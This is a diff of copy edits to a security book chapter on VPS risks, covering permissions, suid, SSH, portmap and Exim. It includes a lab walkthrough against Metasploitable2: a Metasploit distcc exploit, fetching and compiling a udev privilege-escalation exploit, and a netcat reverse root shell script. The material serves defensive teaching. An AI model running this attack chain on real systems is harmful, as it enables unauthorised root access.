@@ -749,19 +749,19 @@ There are many ways to achieve persistence. I have not included any lateral move
 #### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}
 ![](images/ThreatTags/average-common-difficult-moderate.png)
 
-A lack of segmenting of a file system, according to what is the least amount of privilege any authorised parties require is often the precursor to **privilege escalation**.
+Failure to segment a file system or services, according to least privilege principles, is often the precursor to **privilege escalation**. The definition of least privilege in this case being: What is the least amount of privilege any authorised parties require in order to do their job successfully?
 
-Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files whether they be binaries or scripts.
+Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files, whether they be binaries or scripts.
 
-When an executable (usually run as a daemon) is called by one of these privileged services and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable if they think it will go unnoticed.
+When an executable (usually run as a daemon) is called by one of these privileged services, and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable they think will go unnoticed.
 
-If we take the path of least resistance when setting up our partitions on installation by combining file system resources that have lesser requirements for higher privileges, together with those that have greater requirements, then we are not applying the principle of least privilege. What this means is that some resources that do not need the extra privileges in order to do their job, get given them anyway. This allows attackers to take advantage of this, by swapping in (writing) and executing malicious files, directly or indirectly.
+It doesn't pay to take the path of least resistance when setting up our VPS partitions during installation. Combining file system resources with lesser requirements for higher privileges, with those that have greater requirements, contradicts the principle of least privilege. Simply, some resources that don't need extra privileges to do their job, are granted them regardless. This allows attackers to exploit the opportunity, by swapping in (writing) and executing malicious files, directly or indirectly.
 
-If the target file that an attacker wants to swap for a trojanised version is world writeable, user writeable or even group writeable, and they are that user or in the specified group, then they will be able to swap the file... Unless the mounted file system is restrictive enough to mitigate the action.
+If a target file of interest to an attacker is world writeable, user writeable, or even group writeable,  then the attacker will be able to swap or trojanize the file. Only if the mounted file system is restrictive will the action be mitigated.
 
 {#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations}
 1. The first risk is at the file permission and ownership level
-    1. The first tool we can pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which has its source code on [github](https://github.com/pentestmonkey/unix-privesc-check) and is also shipped with Kali Linux, but only the 1.x version (`unix-privesc-check` single file), which is fine, but the later version which sits on the master branch (`upc.sh` main file plus many sub files) does a lot more, so it can be good to use both. You just need to get the shell file(s) from either the `1_x` or `master` branch onto your target machine and run. Running as root allows the testing to be a lot more thorough for obvious reasons. If I'm testing my own host, I will start with the `upc.sh`, I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply looking at the main file will give you a good idea of the options, or you can just run:  
+    1. The first tool to pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which is source hosted on [Github](https://github.com/pentestmonkey/unix-privesc-check) and is shipped with Kali Linux, but only Kali 1.x (`unix-privesc-check` single file). The later version which resides on the master branch (`upc.sh` main file plus many sub files) does a lot more, so consider using both. You just need to pull the shell file(s) from either the `1_x` or `master` branch to your target system and run. Run it as root to allow the testing to be a lot more thorough, for obvious reasons. If I'm testing my own host, I will start with `upc.sh`. I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply reading the main file will give you a good idea of the options, or you can just run:  
     `./upc.sh -h`  
         
         
@@ -772,13 +772,13 @@ If the target file that an attacker wants to swap for a trojanised version is wo
         
     2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.  
     Also check the [Additional Resources](#additional-resources-vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation) chapter for other similar tools for both Linux and Windows.
-2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
+2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying the most restrictive permissions to granular file system partitioning is so effective.
     1. The first and easiest command to run is:  
     `mount`  
-    This will show you the options that all of your file systems were mounted with. In the Countermeasures we address how to improve the permissiveness of these mounted file systems.
-    2. For peace of mind, I usually like to test that the options that our file systems appear to be mounted with actually are. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab` and attempt to run it, it should fail.
+    This will show you the options that all of your file systems were mounted with. In Countermeasures we address how to improve the permissiveness of these mounted file systems.
+    2. For peace of mind, I usually like to ensure that the options that our file systems appear to be mounted with, are the actuall permissions. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab`. When you attempt to run it, it should fail.
     3. You can try writing any file to the file systems that have the `ro` (read-only) option specified against them in the `/etc/fstab`, that should also fail.
-    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being respected. If for example we have an executable that has its `suid` bit set, any other logged in user temporarily inherits the file owners permissions as well as the UID and GID to run that file, rather than their own permissions.
+    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being honoured. As an example, an executable may have its `suid` bit set, but any other logged in user temporarily inherits the file owner's permissions, as well as the UID and GID to run that file, rather than their own permissions.
 
 Running a directory listing that has a file with its `suid` bit set will produce a permission string similar to `-rwsr--r--`  
 The `s` is in the place of the owners executable bit. If instead a capitol `S` is used, it means that the file is not executable
@@ -789,7 +789,7 @@ All `suid` files can be found with the following command:
 All `suid` files owned by root can be found with the following command:  
 `find / -uid 0 -perm -4000 -type f 2>/dev/null`
 
-To add the `suid` bit, you can do so the symbolic way or numeric.
+To add the `suid` bit, you can do so symbolically or numerically.
 
 symbolic:  
 `chmod u+s <yourfile>`
@@ -797,23 +797,23 @@ symbolic:
 numeric:  
 `chmod 4750 <yourfile>`
 
-This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not go setting the `suid` bits on files unless you fully understand what you are doing, and have good reason to. This could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable or the fact that the file can be modified/replaced.
+This adds the `suid` bit, read, write and execute for `owner`, read and execute for `group` and no permissions for `other`. This is just to give you an idea of the relevance of the `4` in the above `-4000`, do not set the `suid` bits on files unless you fully understand what you are doing, and have good reason to do so. Doing so could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable, or the fact that the file can be modified/replaced.
 
-So for example if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
+For example, if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
 
 ![](images/HandsOnHack.png)
 
-We will now walk through the steps of how an attacker may carry out a privilege escalation.
+We will now walk through the attacker's steps to carry out a privilege escalation.
 
-You can find the video of how it is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
+You can find the video of how this is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
 
 I> ## Synopsis
 I>
 I> First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.  
-I> We find a suitable open port with a defective service listening, that is our Vulnerability Scanning / Discovery stage.  
+I> We find a suitable open port with a defective service listening, this is the Vulnerability Scanning / Discovery stage.  
 I> We then search for an exploit that may be effective at giving us at least low privilege access to the machine.  
 I> We then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.  
-I> We then search for exploits that may help us escalate our privileges, based on an area in the file system that we now know we have write and execute permissions on.  
+I> We then search for exploits that may help us escalate our privileges, based on a part of the file system that we now know we have write and execute permissions on.  
 I> We then walk through understanding a chosen exploit and preparing it to be run.
 
 {icon=bomb}
@@ -822,7 +822,7 @@ G>
 G> A simple nmap scan will show us any open ports.  
 G> One of the ports is 3632, with the `distcc` (distributed compiler, useful for speeding up source code compilation) daemon listening.  
 G>
-G> Let us check to see if Metasploit knows about any `distcc` exploits?
+G> Let's check to see if Metasploit is aware of any `distcc` exploits.
 G>
 G> 
 G> `msfconsole`  
@@ -831,9 +831,9 @@ G> `msf > search distcc`
 G> `msf > use exploit/unix/misc/distcc_exec`  
 G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
 G> `msf exploit(distcc_exec) > exploit`  
-G> In the video metasploitable was running at 192.168.56.21 for starters. After this I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
+G> In the video metasploitable was running at 192.168.56.21. Afterwards, I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12
 G>
-G> Now we have a shell. Let us test it.
+G> Now we have a shell, let's test it.
 G>
 G> `pwd`  
 G> `/tmp`  
@@ -850,44 +850,44 @@ G>
 G> `mount`  
 G> Shows us that we have very little in the way of granular partitioning and we have `/` mounted as `rw`, so as a low privileged user, we can both write and execute files in `/tmp` for example.  
 G>
-G> We could also just search for "Privilege Escalation" exploits targeting our targets kernel.  
-G> Let us get the targets Kernel version: `uname -a` produces:  
+G> We could also just search for "Privilege Escalation" exploits targeting our target's kernel.  
+G> Echo the target's kernel version: `uname -a` produces:  
 G> `2.6.24`
 G>
-G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:  
+G> This ([https://www.exploit-db.com/exploits/8572/](https://www.exploit-db.com/exploits/8572/)) looks like an interesting target. Can we compile this on the target though? Do we have `gcc` handy:  
 G> `dpkg -l gcc`  
 G> We do.
 
 {icon=bomb}
 G>
 G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,  
-G> which allowed users to supply their own, which we see in the exploit:  
+G> which allowed users to supply their own, as seen in the exploit:  
 G> `sendmsg(sock, &msg, 0);`
 G>
-G> The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.  
+G> This exploit will run the payload that we will create momentarily, which will open a reverse root shell (because udev is running as root) back to our attacking box.  
 G> We need to pass the PID of the netlink socket as an argument.  
-G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
-G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
+G> When a device is removed, the exploit leverages the `95-udev-late.rules` functionality, which runs arbitrary commands (which we are about to create in `/tmp/run`) via the `REMOVE_CMD` in the exploit.  
+G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. If only we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
 G>
-G> Through our daemon shell that `distcc_exec` provided, let us fetch the exploit:  
+G> Through our daemon shell that `distcc_exec` provided, let's fetch the exploit:  
 G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
-G> The `no-check` is required because metasploitable does not have the relevant CA cert installed.  
+G> The `no-check` is required because Metasploitable does not have the relevant CA cert installed.  
 G> Now check that the file has the contents that you expect.  
 G> `cat privesc.c`
 G>
-G> Let us compile it:  
+G> Compile it:  
 G> `gcc privesc.c -o privesc`  
 G> `ls -liah`  
 G> `privesc`
 G>
-G> Now we need the PID of the udevd netlink socket  
+G> We need the PID of the udevd netlink socket  
 G> `cat /proc/net/netlink`  
-G> Gives us `2299`  
+G> gives us `2299`  
 G> And to check:  
 G> `ps -aux | grep udev`  
-G> Gives us `2300` which should be one more than netlink.
+G> gives us `2300` which should be one more than netlink.
 G>
-G> Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
+G> We need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
 G> Open a connection to 192.168.0.12:1234, then run `/bin/bash`  
 G> `echo '#!/bin/bash' > run`  
 G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
@@ -910,9 +910,9 @@ G> `connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542`
 G> `whoami`  
 G> `root`
 G>
-G> and that is our privilege escalation, we now have root.
+G> That is our privilege escalation, we now have root.
 
-The Countermeasures sections that address are:
+The Countermeasures sections that address this are:
 
 1. [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)
 2. [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions), which also briefly touches on the improving file permissions and ownership
@@ -920,29 +920,29 @@ The Countermeasures sections that address are:
 #### Weak Password Strategies
 ![](images/ThreatTags/difficult-common-average-severe.png)
 
-This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition to that, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.
+This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition, the risks are addressed within the [countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section.
 
 #### Root Logins
 ![](images/ThreatTags/average-common-average-severe.png)
 
-Allowing root logins is a lost opportunity for another layer of defence in depth, where the user must elevate privilages before performaning any task that could possibly negativly impact the system. Once an attacker is root on a system, the system is owned by them. Root is a user and no guess work is required for that username. Other low privilaged users require some guess work on the part of the username as well as the password, and even once both parts of a low privaleged credential have been aquired, there is another step to total system ownership.
+Allowing root logins is another lost layer of defence in depth, where the user must elevate privileges before performing any task that could adversely affect the system. Once an attacker is root on a system, the system is owned, plain and simple. Root is a user afterall, and no guess work is required to take full advantage. Other low privileged users require some guess work on the part of the username, as well as the password. Even once both parts of a low privileged credential have been aquired, there is another step to total system ownership (escalation).
 
 #### SSH
 ![](images/ThreatTags/difficult-uncommon-average-moderate.png)
 
-You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). SSH in itself has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using the default of password authentication and have not configured which remote hosts can or can not access the server, and chose to use a weak password, then your SSH security is only as strong as the password. There are many configurations that a default install of SSH uses in order to get up and running quickly, that need to be modified in order to harden SSH. Using SSH in this manner can be convienient initially, but it is always recommended to move from the defaults to a more secure model of usage. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.
+You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). SSH, in and of itself, has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using password authentication as default, and have not configured which remote hosts are allowed to access the server, and used a weak password, then your SSH security is only as strong as the password. There are many configurations that a default SSH installation uses in order to get up and running quickly, but they need to be modified in order to harden the SSH daemon. Using SSH in this manner can be convienient initially, but it is always recommended to move from defaults to a more secure implementation. I cover many techniques for configuring and hardening SSH in the [SSH Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) section.
 
-#### To Many Boot Options
+#### Too Many Boot Options
 ![](images/ThreatTags/difficult-uncommon-difficult-severe.png)
 
-Being able to boot from alternative media to that of your standard OS, provides additional opportunity for an attacker to install a root-kit on your machine, whether it be virtual or real media.
+The ability to boot from alternative media to your installed OS provides additional opportunity for an attacker to install a root-kit on your system, whether it be virtual, or real media.
 
 #### Portmap {#vps-identify-risks-unnecessary-and-vulnerable-services-portmap}
 ![](images/ThreatTags/easy-common-easy-moderate.png)
 
-An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host, where the target host is an IP address or a host name.
+An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host via an IP address or a host name.
 
-If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the depricated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a collection of attacks. 
+If installed, the `rpcinfo` command with `-p` will list all RPC programs (such as `quotad`, `nfs`, `nlockmgr`, `mountd`, `status`, etc) registered with the port mapper (whether the deprecated `portmap` or the newer `rpcbind`). Many RPC programs are vulnerable to a variety of attacks. 
 
 {title="rpcinfo", linenos=off, lang=bash}
     rpcinfo -p <target host> 
@@ -977,13 +977,13 @@ If installed, the `rpcinfo` command with `-p` will list all RPC programs (such a
     100021    4   udp    679  nlockmgr
     100021    4   tcp    875  nlockmgr
 
-This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to take into the Vulnerability Searching stage discussed in the Process and Practises chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers).
+This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to use in the Vulnerability Searching stage as discussed in the Process and Practises chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers).
 
-The deprecated `portmap` service as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.
+The deprecated `portmap` service, as well as the newer `rpcbind`, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.
 
-Besides providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks, in fact that is why. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.
+In addition to providing the details of RPC services, `portmap` and `rpcbind` are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.
 
-These types of attacks have become very popular amongst distributed attackers due to their significant impact, lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack and how it has become very popular since the beginning of August 2015.  
+These types of attacks have become very popular amongst distributed attackers due to their significant impact, as well as a lack of sophistication and ease of execution. Level 3 Threat Research Labs published a [blog post](http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/) on this port mapper DoS attack, and it's popularity as of August 2015.  
 US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A) on UDP-Based Amplification Attacks outlining the Protocols, Bandwidth Amplification Factor, etc.
 
 {title="rpcinfo", linenos=off, lang=bash, id=vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t}
@@ -1014,47 +1014,47 @@ US-CERT also published an [alert](https://www.us-cert.gov/ncas/alerts/TA14-017A)
     100005    3    tcp       0.0.0.0.182.4          mountd     unknown
     100000    2    udp       0.0.0.0.0.111          portmapper unknown
 
-You will notice in the response as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:
+You will notice in the response, as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:
 
 {title="Wireshark results", linenos=off, lang=bash}
     Source      Destination Protocol Length Info
     <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
     <dest IP>   <source IP> Portmap  726    V3 DUMP Reply (Call In 75)
 
-The packet capture in Wireshark which is not showen here also confirms that it is UDP.
+The packet capture in Wireshark which is not shown here also confirms that it is UDP.
 
 #### EXIM
 ![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)
 
-Exim, along with offerings such as Postfix, Sendmail, Qmail, etc, are Mail Transfer Agents (MTAs), which on a web server are probably not required.
+Exim, along with offerings such as Postfix, Sendmail, Qmail, etc., are Mail Transfer Agents (MTAs) which, on a web server, are probably not required.
 
-There have been plenty of exploits created for Exim security defects. Most of the defects I have seen have patches for, so if Exim is a necessity, stay up to date with your patching. If you are still on a stable (jessie at the time of writing) and can not update to a testing release, make sure to use backports.
+There have been plenty of exploits created for Exim security defects. Most of these defects are patched, so if Exim is a necessity, stay up to date. If you are still on a stable build (jessie at the time of writing) and can not update to a testing release, make sure to use backports.
 
-At the time of writing this, the very front page of the [Exim website](www.exim.org) states "All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release.".
+At the time of this writing, the front page of the [Exim website](www.exim.org) states that "All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release.".
 
-Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87,  
-which 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). Now if we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)) and dissect it a little:
+Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87.  
+Exim 4.86.2 was patched for the likes of [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531). If we have a look at the first exploit for this vulnerability ([https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)), and dissect it a little:
 
 The Perl shell environment variable `$PERL5OPT` can be assigned  options, these options will be interpreted as if they were on the `#!` line at the beginning of the script. These options will be treated as part of the command run, after any optional switches included on the command line are accepted. 
 
-`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, so with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line like the following, which runs the script as root:
+`-M`, which is one of the allowed switches (`-`[`DIMUdmw`]) to be used with `$PERL5OPT` allows us to attempt to use a module from the command line, with `-Mroot` we are trying to use the `root` module, then `PERL5OPT=-Mroot` effectively puts `-Mroot` on the first line as follows, which runs the script as root:
 
 `#!perl -Mroot` 
 
 The Perl shell environment variable `$PERL5LIB` is used to specify a colon (or semicolon on Windows) separated list of directories in which to look for Perl library files before looking in the standard library and the current directory.
 
-Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run, means the first place execution will look for the root module is in the `/tmp` directory.
+Assigning `/tmp` to `$PERL5LIB` immediately before the exploit is run causes the first execution for the root module to occur from the `/tmp` directory.
 
 #### NIS {#vps-identify-risks-unnecessary-and-vulnerable-services-nis}
 ![](images/ThreatTags/difficult-uncommon-difficult-moderate.png)
 
 **Some History**:
 
-NIS+ was introduced as part of Solaris 2 in 1992 with the intention that it would eventually replace Network Information Service (NIS), originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).
+NIS+ was introduced as part of Solaris 2 in 1992 with the intention of replacing Network Information Service (NIS), originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).
 
 **What NIS is**:
 
-NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many machines in a network share a common set of configuration files with the same account information, such as the commonly local stored UNIX:
+NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many networked machines share a common set of configuration files with the same account information, such as the commonly local stored UNIX:
 
 * users
 * their groups
@@ -1063,7 +1063,7 @@ NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providi
 * etc
 * and contents of the `/etc/passwd` and referenced `/etc/shadow` which contains the hashed passwords, discussed in detail under the [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies) section
 
-The NIS master server maintains canonical database files called maps. We also have slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.
+The NIS master server maintains canonical database files called maps. There are also slave servers which have copies of these maps. Slave servers are notified by the master via the `yppush` program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through `ypserv`.
 
 **Vulnerabilities and exploits**:
 
